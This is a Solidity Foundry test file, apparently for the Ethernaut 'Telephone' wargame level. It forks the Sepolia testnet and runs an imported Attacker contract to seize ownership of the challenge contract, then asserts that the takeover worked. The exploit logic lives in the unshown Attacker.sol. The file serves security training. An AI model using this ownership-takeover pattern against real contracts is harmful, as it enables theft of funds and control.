// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Attacker} from "../src/04-Telephone/Attacker.sol";

interface ITelephone {
    function changeOwner(address _owner) external;
    function owner() external view returns (address);
}

contract TestTelephone is Test{
    address constant public TARGET_ADDRESS = 0x5Db2e51B698520ceB8b29057a8693D104C6cB4dB;
    ITelephone target;
    address attacker;
    Attacker attackerContract;

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        target = ITelephone(TARGET_ADDRESS);
        attacker = makeAddr("attacker");
        attackerContract = new Attacker(TARGET_ADDRESS);
    }

    function testTelephone() public {
        // Arrange
        vm.prank(attacker);
        
        // Act
        attackerContract.attack();
        
        // Assert
        assertEq(target.owner() , attacker);
    }
}
